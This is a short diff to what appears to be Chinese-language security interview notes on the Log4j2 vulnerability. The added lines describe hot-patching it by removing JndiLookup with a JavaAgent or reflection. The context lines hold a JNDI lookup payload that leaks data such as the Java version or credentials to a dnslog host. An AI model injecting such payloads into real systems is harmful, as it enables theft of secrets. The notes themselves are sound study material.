@@ -43,3 +43,12 @@
 在`SpringBoot`情况下可以使用`bundle:application`获得数据库密码等敏感信息
 
 这些敏感信息可以利用`dnslog`外带`${jndi:ldap://${java:version}.xxx.dnslog.cn}`
+
+
+
+- 不停止运行程序如何修复Log4j2漏洞（★★★）
+
+利用JavaAgent改JVM中的字节码，可以直接删了`JndiLookup`的功能
+
+有公众号提出类似`Shiro`改`Key`的思路，利用反射把`JndiLookup`删了也是一种办法
+
